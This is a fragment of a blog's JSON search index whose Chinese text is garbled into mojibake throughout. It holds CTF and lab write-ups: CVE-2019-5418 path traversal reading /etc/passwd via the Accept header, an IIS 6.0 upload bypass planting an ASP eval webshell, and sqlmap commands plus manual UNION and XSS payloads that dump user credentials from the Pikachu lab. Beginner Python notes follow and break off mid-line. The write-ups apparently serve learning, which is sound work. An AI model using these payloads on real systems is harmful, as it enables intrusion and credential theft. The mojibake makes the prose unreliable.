https://www.cnblogs.com/pursue-security/p/15374168.html","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://sinky.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"Ruby On Railsæ¼æ´å¤ç°ç¬¬äºŒé¢˜ï¼ˆCVE-2019-5418ï¼‰","slug":"é¶åœºï¼šRuby On Railsæ¼æ´å¤ç°ç¬¬äºŒé¢˜ï¼ˆCVE-2019-5418ï¼‰","date":"2022-08-16T03:07:09.028Z","updated":"2022-08-16T03:58:12.828Z","comments":true,"path":"2022/08/16/é¶åœºï¼šRuby On Railsæ¼æ´å¤ç°ç¬¬äºŒé¢˜ï¼ˆCVE-2019-5418ï¼‰/","link":"","permalink":"https://sinky.top/2022/08/16/%E9%9D%B6%E5%9C%BA%EF%BC%9ARuby%20On%20Rails%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%AC%E4%BA%8C%E9%A2%98%EF%BC%88CVE-2019-5418%EF%BC%89/","excerpt":"","text":"èƒŒæ™¯ä»‹ç»Ruby On Railsæ˜¯ä¸€ä¸ªè‘—åçš„Ruby Webå¼€å‘æ¡†æ¶ï¼Œå®ƒåœ¨å¼€å‘ç¯å¢ƒä¸­ä½¿ç”¨Sprocketsä½œä¸ºé™æ€æ–‡ä»¶æœåŠ¡å™¨ã€‚Sprocketsæ˜¯ä¸€ä¸ªRubyåº“ï¼Œç”¨äºç¼–è¯‘å’Œåˆ†å‘é™æ€èµ„æºæ–‡ä»¶ã€‚ å®è®­ç›®æ ‡1ã€å­¦ä¼šæ ¹æ®æ¼æ´ç¼–å·æŸ¥æ‰¾æ¼æ´è¯¦æƒ…ï¼› 2ã€äº†è§£Ruby On Railsï¼ˆCVE-2019-5418ï¼‰å½¢æˆåŸç†ï¼› 3ã€å­¦ä¹ Ruby On Railsï¼ˆCVE-2019-5418ï¼‰åˆ©ç”¨æ–¹æ³•ï¼› è§£é¢˜æ–¹å‘åˆ©ç”¨å·²çŸ¥æ¼æ´è¯»å–æ–‡ä»¶passwd; é¢˜ç›® å…ˆç™¾åº¦æŸ¥ä¸€ä¸‹CVE-2019-5418æ¼æ´è¯¦æƒ…ï¼š æ¼æ´æè¿°ï¼šç”±äºRubt on Railsä½¿ç”¨äº†æŒ‡å®šå‚æ•°çš„render fileæ¥æ¸²æŸ“åº”ç”¨ä¹‹å¤–çš„è§†å›¾ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹è®¿é—®æŸæ§åˆ¶å™¨çš„è¯·æ±‚åŒ…ï¼Œé€šè¿‡â€œ../../../../â€æ¥è¾¾åˆ°è·¯å¾„ç©¿è¶Šçš„ç›®çš„ï¼Œç„¶åå†é€šè¿‡\\{\\{(æ­¤å¤„æ˜¯ä¸¤ä¸ªå·¦å¤§æ‹¬å·ï¼Œå› ä¸ºè¯­æ³•é—®é¢˜åªèƒ½è¿™ä¹ˆå†™äº†ï¼Œä¸‹åŒæ­¤åŸå› )æ¥è¿›è¡Œæ¨¡æ¿æŸ¥è¯¢è·¯å¾„çš„é—­åˆï¼Œä½¿å¾—æ‰€è¦è®¿é—®çš„æ–‡ä»¶è¢«å½“ä½œå¤–éƒ¨æ¨¡æ¿æ¥è§£æã€‚ å½±å“ç‰ˆæœ¬ï¼šRailså…¨ç‰ˆæœ¬ï¼Œå…¶ä¸­ä¿®å¤ç‰ˆæœ¬ï¼š6.0.0.beta3; 5.2.2.1; 5.1.6.2; 5.0.7.2; 4.2.11.1 è§£é¢˜è®¿é—®IPï¼šç«¯å£/robotsï¼ŒbpæŠ“åŒ… robotsæ–‡ä»¶ï¼šç½‘ç«™è·Ÿçˆ¬è™«é—´çš„åè®®ï¼Œç”¨ç®€å•ç›´æ¥çš„txtæ ¼å¼æ–‡æœ¬æ–¹å¼å‘Šè¯‰å¯¹åº”çš„çˆ¬è™«è¢«å…è®¸çš„æƒé™ï¼Œå³robots.txtæ˜¯æœç´¢å¼•æ“ä¸­è®¿é—®ç½‘ç«™çš„æ—¶å€™è¦æŸ¥çœ‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚ ä¿®æ”¹æ•°æ®åŒ…Acceptå†…å®¹ä¸º ../../../../../etc/passwd\\{\\{,é€šè¿‡è·¯å¾„ç©¿è¶Šå®ç°äº†ä»»æ„æ–‡ä»¶è¯»å– key: mozhe0b757871236a2e73bad56ff2eb6 æ¼æ´ä¿®å¤1ã€å‡çº§ 2ã€ç¦æ­¢æ¥å—acceptä»»æ„çš„type","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"å¢¨è€…å­¦é™¢","slug":"å¢¨è€…å­¦é™¢","permalink":"https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"},{"name":"ä»»æ„æ–‡ä»¶è¯»å–","slug":"ä»»æ„æ–‡ä»¶è¯»å–","permalink":"https://sinky.top/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"é¶åœºï¼šå†…éƒ¨æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿæ¼æ´åˆ†ææº¯æº","slug":"é¶åœºï¼šå†…éƒ¨æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿæ¼æ´åˆ†ææº¯æº","date":"2022-08-14T03:21:54.947Z","updated":"2022-08-14T08:31:03.086Z","comments":true,"path":"2022/08/14/é¶åœºï¼šå†…éƒ¨æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿæ¼æ´åˆ†ææº¯æº/","link":"","permalink":"https://sinky.top/2022/08/14/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%86%85%E9%83%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90/","excerpt":"","text":"æ–‡ä»¶ä¸Šä¼ æ¼æ´æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½å®ç°ä»£ç æ²¡æœ‰ä¸¥æ ¼é™åˆ¶ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶åç¼€ä»¥åŠæ–‡ä»¶ç±»å‹ï¼Œå¯¼è‡´å…è®¸æ”»å‡»è€…å‘æŸä¸ªå¯ä»¥é€šè¿‡webè®¿é—®çš„ç›®å½•ä¸Šä¼ ä»»æ„PHPæ–‡ä»¶ï¼Œå¹¶èƒ½å¤Ÿå°†è¿™äº›æ–‡ä»¶ä¼ é€’ç»™PHPè§£é‡Šå™¨ï¼Œå°±å¯ä»¥åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„PHPè„šæœ¬ã€‚ å½“ç³»ç»Ÿå­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥å°†ç—…æ¯’ã€æœ¨é©¬ã€WebShellä»¥åŠå…¶ä»–æ¶æ„è„šæœ¬æˆ–è€…æ˜¯åŒ…å«äº†è„šæœ¬çš„å›¾ç‰‡ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œè¿™äº›æ–‡ä»¶å°†å¯¹æ”»å‡»è€…åç»­æ”»å‡»æä¾›ä¾¿åˆ©ï¼Œæ ¹æ®å…·ä½“æ¼æ´å·®å¼‚ï¼Œä¸Šä¼ çš„è„šæœ¬å¯ä»¥æ˜¯æ­£å¸¸åç¼€çš„PHPã€ASPä»¥åŠJSPè„šæœ¬ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸²æ”¹åç¼€åçš„è¿™å‡ ç±»è„šæœ¬ã€‚ è§£é¢˜ æ€è·¯ éªŒè¯ä¸Šä¼ ç‚¹æ˜¯å¦å¯ç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ éªŒè¯æ˜¯å¦å­˜åœ¨å‰ç«¯éªŒè¯ éªŒè¯æ˜¯å¦å¼€å¯mimeç»•è¿‡ éªŒè¯æ˜¯å¦å¼€å¯æ–‡ä»¶å¦æ£€æµ‹ éªŒè¯æ˜¯å¦å­˜åœ¨æ–‡ä»¶è§£ææ¼æ´éªŒè¯ ä¸€å¥è¯æœ¨é©¬ ä¸Šä¼ å¤±è´¥ phpæˆ–aspæ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œä½†txtã€jpgç­‰å¯ä»¥ä¸Šä¼  é€šè¿‡F12æŸ¥çœ‹æœåŠ¡ï¼Œä¸ºIIS/6.0 IIS6.0æ¼æ´è¯¥ç‰ˆæœ¬é»˜è®¤å°†.asp;.jpgæ­¤ç§æ ¼å¼çš„æ–‡ä»¶åï¼Œå½“æˆaspè§£æï¼ŒæœåŠ¡å™¨é»˜è®¤ä¸è§£æ;å·æå…¶åé¢çš„å†…å®¹ï¼Œç›¸å½“äºæˆªæ–­ã€‚ ä¾‹å¦‚ï¼šä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œåå­—ä¸ºâ€œxiao.asp;.jpgâ€çš„æœ¨é©¬æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å¯ä»¥è¢«å½“ä½œaspæ–‡ä»¶è§£æå¹¶æ‰§è¡Œã€‚ IISé™¤äº†ä¼šå°†aspè§£ææˆè„šæœ¬æ‰§è¡Œæ–‡ä»¶ä¹‹å¤–ï¼Œè¿˜ä¼šå°†cer sdx asa æ‰©å±•åè§£ææˆaspã€‚ æ„é€ ä¸€å¥è¯æœ¨é©¬å½“æˆ‘ä»¬ä¸Šä¼ xxx.aspæ–‡ä»¶æ—¶ï¼Œè¯¥æ–‡ä»¶ä»¥åçš„å­æ–‡ä»¶éƒ½ä»¥aspæ–‡ä»¶æ¥æ‰§è¡Œã€‚ &lt;% eval request(\"a\") %&gt; ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬çš„hack.txtæ–‡ä»¶ï¼Œå¹¶ç”¨bpæŠ“åŒ…ï¼š æ”¹æˆhack.aspï¼Œè¿™æ ·æœåŠ¡å™¨è¯»åˆ°hack.aspç›®å½•æ—¶åé¢éƒ½ä»¥aspæ–‡ä»¶æ‰§è¡Œã€‚ æœ€åæ‰“å¼€èšå‰‘ï¼Œè¿æ¥å…¶è¿”å›åœ°å€ï¼Œæ‰¾åˆ°keyå³å¯ã€‚ KEY:mozhe7f5448dfef4b57464d1c37c75bf åè®°ï¼ˆ2022.8.14ï¼‰åšé¢˜æ—¶çœ‹å¤§ä½¬çš„writeupè§£çš„ï¼Œå®Œå…¨ä¸ä¼šï¼Œä¸€çŸ¥åŠè§£ï¼Œåšå®Œäº†æ„Ÿè§‰ä¼šäº†ä¸€ç‚¹ï¼Œæœ€èµ·ç äº†è§£äº†IIS6.0æ¼æ´å’Œæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„æµ‹éªŒæ–¹å¼ã€‚","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"å¢¨è€…å­¦é™¢","slug":"å¢¨è€…å­¦é™¢","permalink":"https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://sinky.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"WebShell","slug":"WebShell","permalink":"https://sinky.top/tags/WebShell/"}]},{"title":"pikachu-SQLæ³¨å…¥","slug":"pikachu-SQLæ³¨å…¥","date":"2022-08-14T02:39:51.516Z","updated":"2022-08-14T02:42:04.768Z","comments":true,"path":"2022/08/14/pikachu-SQLæ³¨å…¥/","link":"","permalink":"https://sinky.top/2022/08/14/pikachu-SQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"æ¦‚è¿°æ•°æ®åº“æ³¨å…¥æ¼æ´ SQLæ³¨å…¥æ¼æ´å½¢æˆåŸå› ï¼šåœ¨æ•°æ®äº¤äº’ä¸­ï¼Œå‰ç«¯çš„æ•°æ®ä¼ å…¥åˆ°åå°å¤„ç†æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„åˆ¤æ–­ï¼Œå¯¼è‡´å…¶ä¼ å…¥çš„â€œæ•°æ®â€æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­åï¼Œè¢«å½“ä½œsqlè¯­å¥çš„ä¸€éƒ¨åˆ†æ‰§è¡Œï¼Œä»è€Œå¯¼è‡´æ•°æ®åº“å—æŸï¼ˆè¢«è„±åº“ã€è¢«åˆ é™¤ã€ç”šè‡³æ•´ä¸ªæœåŠ¡å™¨æƒé™æ²¦é™·ï¼‰é˜²æ­¢SQLæ³¨å…¥æ¼æ´çš„ç­–ç•¥ï¼š 1ã€å¯¹ä¼ è¿›SQLè¯­å¥é‡Œé¢çš„å˜é‡è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å±é™©å­—ç¬¦ä¼ å…¥ 2ã€ä½¿ç”¨å‚æ•°åŒ–ï¼ˆParameterized Query æˆ– Parameterized Statementï¼‰ æ•°å­—å‹æ³¨å…¥ éšä¾¿æäº¤ï¼ŒæŠ“åŒ…å¯çŸ¥ï¼Œæ˜¯postæ–¹å¼æäº¤çš„å‚æ•°ä¸º id=2&amp;submit=%E6%9F%A5%E8%AF%A2 ä½¿ç”¨sqlmapè·‘postæ–¹å¼æ—¶çš„æ ¼å¼ä¸ºï¼š python2 sqlmap.py â€u \"&lt;url&gt;\" â€â€data=\"&lt;postæäº¤çš„å‚æ•°&gt;\" â€&lt;å‚æ•°&gt; 1ã€ä½¿ç”¨sqlmapè·‘æ•°æ®åº“ python2 sqlmap.py â€u \"http://localhost/pikachu/vul/sqli/sqli_id.php\" â€â€data=\"id=2&amp;submit=%E6%9F%A5%E8%AF%A2\" â€f â€â€dbms mysql â€â€dbs â€â€batch æ³¨é‡Šï¼š â€â€dbms æ¢æµ‹æ•°æ®åº“æ˜¯ä»€ä¹ˆ â€â€dbms mysql æŒ‡å®šæ•°æ®åº“ç±»å‹ä¸ºmysqlæ•°æ®åº“ â€â€dbs å½“ç”¨æˆ·æœ‰æƒè¯»å–æ—¶ï¼Œåˆ—å‡ºæ‰€æœ‰çš„æ•°æ®åº“ â€â€batch è¯¥å‚æ•°ä½¿ç”¨åä¸éœ€è¦ç”¨æˆ·è¾“å…¥ï¼Œå°†ä¼šä½¿ç”¨sqlmapç»™çš„é»˜è®¤æç¤ºèµ°ä¸‹å» 2ã€æŸ¥æ•°æ®åº“pikachuä¸‹çš„è¡¨ python2 sqlmap.py â€u \"http://localhost/pikachu/vul/sqli/sqli_id.php\" â€â€data=\"id=2&amp;submit=%E6%9F%A5%E8%AF%A2\" â€f â€â€dbms mysql â€D pikachu â€â€tables â€â€batch æ³¨é‡Šï¼š â€D pikachu æŒ‡å®šæ•°æ®åº“pikachu â€â€tables å½“æœ‰æƒé™è¯»å–pikachuæ•°æ®åº“ä¸­çš„è¡¨tablesæ—¶ï¼Œè¯»å–å‡ºè¡¨ 3ã€è·å–è¡¨usersä¸­çš„åˆ— python2 sqlmap.py â€u \"http://localhost/pikachu/vul/sqli/sqli_id.php\" â€â€data=\"id=2&amp;submit=%E6%9F%A5%E8%AF%A2\" â€f â€â€dbms mysql â€D pikachu â€T users â€â€columns â€â€batch æ³¨é‡Šï¼š â€T users æŒ‡å®šè¡¨æ˜users â€â€colmns å½“æœ‰æƒé™è¯»å–è¡¨usersä¸­çš„åˆ—çš„æ—¶å€™è¯»å–è¡¨usersä¸­çš„åˆ—ã€‚ 4ã€è·å–åˆ—usernameå’Œpasswordä¸­çš„å­—æ®µå†…å®¹ python2 sqlmap.py â€u \"http://localhost/pikachu/vul/sqli/sqli_id.php\" â€â€data=\"id=2&amp;submit=%E6%9F%A5%E8%AF%A2\" â€f â€â€dbms mysql â€D pikachu â€T users â€C username,password â€â€dump â€â€batch æ³¨é‡Šï¼š â€C username,password æŒ‡å®šè¯»å–åˆ—usernameå’Œpasswordä¸­çš„å­—æ®µå†…å®¹ â€â€dump æŠ›å‡ºå‰é¢æŒ‡å®šå†…å®¹ æ‰‹å·¥æ³¨å…¥1ã€æäº¤ï¼ŒæŠ“åŒ… 2ã€æäº¤æ’ç­‰è¯­å¥å¯ä»¥æŸ¥è¯¢åˆ°æ‰€æœ‰çš„æ•°æ®ä¿¡æ¯ å­—ç¬¦å‹æ³¨å…¥ GETæ–¹æ³•å–è¡¨ï¼ŒæŠ“åŒ…ï¼š å‚æ•°è¿”å›ï¼š GET /pikachu/vul/sqli/sqli_str.php?name=&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1 ä½¿ç”¨sqlmapè·‘ï¼š 1ã€æŸ¥æ•°æ®åº“ python2 sqlmap.py â€u \"http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2\" â€â€dbms mysql â€â€dbs 2ã€æŸ¥è¡¨ python2 sqlmap.py â€u \"http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2\" â€â€dbms mysql â€â€dbs â€â€batch 3ã€æŸ¥åˆ— python2 sqlmap.py â€u \"http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2\" â€â€dbms mysql â€D pikachu â€T users â€â€columns â€â€batch 4ã€æŸ¥å­—æ®µ python2 sqlmap.py â€u \"http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2\" â€â€dbms mysql â€D pikachu â€T users â€C username,password â€â€dump â€â€batch æœç´¢å‹æ³¨å…¥ä¸ºæ–¹ä¾¿ç”¨æˆ·ï¼Œæä¾›æœç´¢åŠŸèƒ½ï¼Œä½†æ˜¯å› ä¸ºæ²¡å¯¹å˜é‡è¿‡æ»¤ï¼Œå¯¼è‡´æ¼æ´ï¼Œåˆ†ä¸ºpost getï¼Œgetå‹ä¸€èˆ¬ç”¨åœ¨ç½‘ç«™ä¸Šçš„æœç´¢ï¼Œpostç”¨äºç”¨æˆ·åç™»å½•ï¼Œæœç´¢å‹æ³¨å…¥åˆç§°æ–‡æœ¬æ¡†æ³¨å…¥ åŸç†$sql=\"select * from user where password like '%$pwd%' order by password\"; %åŒ¹é…ä»»ä½•å­—ç¬¦ï¼Œè¿™å¥sqlè¯­å¥å°±æ˜¯åŸºäºç”¨æˆ·è¾“å…¥çš„pwsåœ¨usersè¡¨ä¸­æ‰¾åˆ°ç›¸åº”çš„passwordã€‚ å¦‚æœç”¨æˆ·ç«¯è¾“å…¥: and 1=1 and '%'=åˆ™ä¼šå˜æˆï¼š $sql=\"select * from user where password like '%fendo'and 1=1 and '%'='%' order by password\"; å­˜åœ¨sqlæ³¨å…¥ã€‚é¢˜ è¾“å…¥ä¸€ä¸ªå•å¼•å·â€™ æŠ¥é”™ï¼Œå› ä¸ºå•å¼•å·å¯¼è‡´è¯­å¥%â€™æ²¡é—­åˆã€‚ è¾“å…¥ 'and 1=1 and '%'=' ,æ­¤æ—¶è¯­å¥å˜ä¸ºï¼š '%' and 1=1 and '%'='%' order by password è¿˜å¯ä»¥ï¼š %â€™ and 1=1â€â€â€™ â€˜ and 1=1# %â€™ and 1=1 and â€˜%â€™=â€™ å¯è¾“å…¥ ' and 1=1 order by x# é€šè¿‡order by x ç¡®å®šå­—æ®µæ•°ï¼Œè¾“å…¥' and 1=1 order by 3#è¿”å›æ­£å¸¸é¡µé¢ è¾“å…¥order by 4#è¿”å›æŠ¥é”™ï¼Œè¯´æ˜å­—æ®µæ•°ä¸º3. è¾“å…¥ %' and 1=2 union select 1,2,3# ï¼ˆ1ï¼‰1ï¼Œ2ï¼Œ3éƒ½å¯ä»¥å›æ˜¾ï¼Œè¾“å…¥ %â€™ and 1=2 union select 1,2,(database())# å¯çˆ†å‡ºå½“å‰ä½¿ç”¨æ•°æ®åº“pikachu ï¼ˆ2ï¼‰è¾“å…¥ %â€™ and 1=2 union select 1,2,table_name from information_schema.columns where table_schema=â€™pikachuâ€™# å¾—åˆ°pikachuæ•°æ®åº“ä¸‹æ‰€æœ‰è¡¨åã€‚ ï¼ˆ3ï¼‰é€‰æ‹©usersè¡¨ï¼Œè¾“å…¥ %â€™ and 1=2 union select 1,2,column_name from information_schema.columns where table_name=â€™usersâ€™# å¾—åˆ°usersè¡¨ä¸‹çš„æ‰€æœ‰å­—æ®µå ï¼ˆ4ï¼‰è¾“å…¥ %â€™ and 1=2 union select 1,2,username from pikachu.users# (é¡¶å¤šè·Ÿç€ç½‘ä¸Šæ•™ç¨‹åšäº†ä¸€éï¼ŒæŒºæ‡µé€¼çš„å…¶å®ã€‚â€“2020.1.7) xxå‹æ³¨å…¥xxå‹æ³¨å…¥æ˜¯ä»€ä¹ˆé¬¼ï¼Œçœ‹åˆ°æç¤ºç¬‘æ­» éšä¾¿è¾“å…¥å­—ç¬¦æŠ“ä¸ªåŒ…ï¼Œæ˜¯GETå‹è¯·æ±‚ï¼Œè¾“å…¥ç‰¹æ®Šå­—ç¬¦'\"&lt;&gt;666,å›æ˜¾æŠ¥é”™. å°è¯•é—­åˆä¸€ä¸‹ï¼š #'&gt; &lt;script&gt;alert(\"XSS\")&lt;/script&gt; å“å—¨ï¼æˆåŠŸå¼¹å‡ºxssï¼Œæˆ‘çœŸæ˜¯è¿›æ­¥äº†ã€‚ å·®ç‚¹å¿˜è®°è¿™æ˜¯sqlæ³¨å…¥äº†ï¼Œè¾“å…¥ä¸€ä¸‹ä¸‡èƒ½æ’ç­‰å¼ï¼š ' and 1=1 '%'=' å›æ˜¾æŠ¥é”™ï¼Œæœ‰æˆï¼Œä½†æ˜¯æ¥ä¸‹æ¥è¦æ€ä¹ˆæ„é€ å‘¢ï¼Ÿæˆ‘å…ˆçœ‹ä¸€ä¸‹å‰ç«¯ä»£ç å§ã€‚è¿™æ˜¯ä»urlé‚£ä¸ªnameå»è·å–åˆ°è¾“å…¥çš„ï¼Œå‰ç«¯ä»£ç æ²¡å•¥ç”¨ï¼Œæˆ‘å»çœ‹ä¸€ä¸‹åå°å§ã€‚ åº”è¯¥æ˜¯è¿™é‡Œäº†ï¼Œåˆ†æä¸€ä¸‹ï¼Œæ²¡çœ‹æ‡‚ï¼Œæ³¨æ„åˆ°é‚£ä¸ª$queryåé¢çš„ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œå°è¯•äº†å‡ ä¸ªï¼Œå¤±è´¥ï¼Œæœæ–­ä¸æµªè´¹æ—¶é—´æ‰¾wpå§ã€‚ 1ã€ä¼ è¾“æ–¹å¼ä¸ºgetï¼Œä¼ è¾“å‚æ•°ä¸º name=a&amp;submit=%E6%9F%A5%E8%AF%A 2ã€æµ‹è¯•ä½¿å…¶é—­åˆçš„ç¬¦å·ï¼šâ€™ â€ &lt;&gt;&amp; â€“+å•å¼•å·ä¼šæŠ¥é”™ï¼Œåˆæ­¥æ¨æµ‹ä½¿ç”¨å•å¼•å·ä½¿å…¶é—­åˆ 3ã€åˆ©ç”¨è”åˆæŸ¥è¯¢ï¼š a') union select 1,2# çˆ†å‡ºæ•°æ®åº“åå­—ï¼š a') union select database(),2 # çˆ†å‡ºusersï¼š a') union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu' # æŸ¥ åˆ—ï¼š a') union select 1,group_concat(column_name) from information_schema.columns where table_name='users' # æŸ¥å­—æ®µï¼š a') union select 1,concat(username,password) from pikachu.users # \"insert/update\"æ³¨å…¥","categories":[],"tags":[{"name":"pikachu","slug":"pikachu","permalink":"https://sinky.top/tags/pikachu/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://sinky.top/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"Pythonå­¦ä¹ 2","slug":"pythonå­¦ä¹ 2","date":"2022-08-13T14:45:32.587Z","updated":"2022-08-14T02:53:20.139Z","comments":true,"path":"2022/08/13/pythonå­¦ä¹ 2/","link":"","permalink":"https://sinky.top/2022/08/13/python%E5%AD%A6%E4%B9%A02/","excerpt":"","text":"åˆ†æ”¯ç»“æ„1ã€ifâ€¦elseâ€¦ eg: 12345money=1000s=int(input('è¯·è¾“å…¥å–æ¬¾é‡‘é¢ï¼š'))if money &gt;=s: money=money-s print('å–æ¬¾æˆåŠŸï¼Œä½™é¢ä¸ºï¼š',money) eg: ä»é”®ç›˜è¾“å…¥ä¸€ä¸ªæ•°åˆ¤æ–­å¥‡å¶ã€‚ 12345num=int(input(\"è¯·è¾“å…¥ä¸€ä¸ªæ•°å­—ï¼š\"))if num%2==0: print(num,'æ˜¯å¶æ•°')else: print(num,'æ˜¯å¥‡æ•°') 2ã€å¤šåˆ†æ”¯ï¼šifâ€¦elifâ€¦else eg: å½•å…¥æˆç»©ï¼š90-100ä¸ºA,80-89ä¸ºB,70-79ä¸ºC,60-69ä¸ºD,50-59ä¸ºE,è¾“å…¥å°äº0æˆ–å¤§äº100ä¸ºé”™è¯¯è¾“å…¥ã€‚ 12345678910111213score=int(input('è¯·è¾“å…¥ä½ çš„æˆç»©ï¼š'))if 90&lt;=score&lt;=100: print(\"you are A\")elif 80&lt;=score&lt;90: print('you are B')elif 70&lt;=score&lt;80: print(\"you are C\")elif 60&lt;=score&lt;70: print(\"you are D\")elif 0&lt;=score&lt;60: print('you are E')else: print('Error!!') 3ã€åµŒå¥—if eg: è´­ç‰©ç»“ç®—æ—¶ï¼Œä¼šå‘˜&gt;=200 æ‰“å…«æŠ˜ï¼Œ&gt;=100æ‰“ä¹æŠ˜ï¼Œ&lt;100ä¸æ‰“æŠ˜ï¼›éä¼šå‘˜ &gt;=200 æ‰“9.5æŠ˜ï¼Œ&lt;200 ä¸æ‰“æŠ˜ 12345678910111213141516answer=input(\"æ‚¨æ˜¯å¦ä¸ºä¼šå‘˜ï¼Ÿy or nï¼š \")money=int(input(\"è¯·è¾“å…¥æ‚¨çš„é‡‘é¢ï¼š\"))if answer=='y': if money&gt;=200: print(\"æ‰“å…«æŠ˜ï¼Œæ‚¨èŠ±è´¹äº†ï¼š\",money*0.8) elif money&gt;=100: print(\"æ‰“ä¹æŠ˜ï¼Œæ‚¨èŠ±è´¹äº†ï¼š\",money*0.9) else: print(\"ä¸æ‰“æŠ˜ï¼Œæ‚¨èŠ±è´¹äº†ï¼š\",money)elif answer=='n': if money&gt;=200: print(\"æ‰“ä¹äº”æŠ˜ï¼Œæ‚¨èŠ±è´¹äº†ï¼š\",money*0.95) else: print(\"ä¸æ‰“æŠ˜ï¼Œæ‚¨èŠ±è´¹äº†ï¼š\",money)else: print(\"æ‚¨è¾“å…¥æœ‰è¯¯ï¼\") æ¡ä»¶è¡¨è¾¾å¼ï¼š x if åˆ¤æ–­æ¡ä»¶ else y eg: æ¯”å¤§å° 123a=int(input(\"input a num:\"))b=int(input('input a num:'))print( str(a)+'å¤§äºç­‰äº'+str(b) if a&gt;b else str(a)+'å°äºç­‰äº'+str(b)) pass: å ä½ç¬¦ï¼Œä»€ä¹ˆä¹Ÿä¸åšã€‚ å†…ç½®å‡½æ•° range() range(stop) â€”â€” åˆ›å»ºï¼ˆ0,stopï¼‰ä¹‹é—´çš„æ•´æ•°åºåˆ—ï¼Œæ­¥é•¿ä¸º1 range(start,stop) â€”â€” ï¼ˆstart,stopï¼‰ä¹‹é—´ï¼Œæ­¥é•¿ä¸º1 range(start,stop,step) â€”â€” ï¼ˆstart,stopï¼‰,æ­¥é•¿ä¸ºstep eg: 12345678r=range(10)print(r)r=range(1,10)print(list(r)) #[1, 2, 3, 4, 5, 6, 7, 8, 9]print(10 in r) # Falseprint(9 in r) # Trueprint(10 not in r) #Trueprint(9 not in r) #False å¾ªç¯ç»“æ„1ã€while æ¡ä»¶è¡¨è¾¾å¼ï¼š å¾ªç¯ä½“ eg: è®¡ç®—0åˆ°4çš„ç´¯åŠ å’Œ 1234567a=0sum=0while a&lt;5: sum+=a a+=1print('å’Œä¸ºï¼š',sum) # 10 eg:è®¡ç®—1-100ä¹‹é—´å¶æ•°å’Œ 12345678a=1sum=0while a&lt;101: if a%2==0: sum+=a a+=1print(sum) # 2550 2ã€for-inå¾ªç¯ ä¾æ¬¡å–å€¼ï¼Œåˆç§°éå† for å˜é‡ in å¯è¿­ä»£å¯¹è±¡ï¼š å¾ªç¯ä½“ åœ¨å¾ªç¯ä½“ä¸­ä¸éœ€è¦å˜é‡æ—¶ï¼Œå¯å†™ä½œâ€˜_â€™ 123456for i in 'python': print(i)for a in range(10): print(a)for _ in range(5): print('äººç”Ÿè‹¦çŸ­ï¼Œæˆ‘ç”¨python') eg:è®¡ç®—1-100ä¹‹é—´å¶æ•°å’Œ 12345sum=0for i in range(1,101): if i%2==0: sum+=iprint(sum) eg: è®¡ç®—åƒä»¥å†…çš„æ°´ä»™èŠ±æ•° 123456for n in range(100,1000): c=n%10 b=n//10%10 a=n//100 if n==a**3+b**3+c**3: print(n) 3ã€æµç¨‹æ§åˆ¶è¯­å¥break ç”¨äºç»“æŸå¾ªç¯ç»“æ„ eg:å½•å…¥å¯†ç ï¼Œæœ€å¤šè¾“å…¥ä¸‰æ¬¡ï¼Œæ­£ç¡®åˆ™ç»“æŸé€€å‡ºã€‚ 1234567for i in range(3): pwd=input('è¯·è¾“å…¥å¯†ç 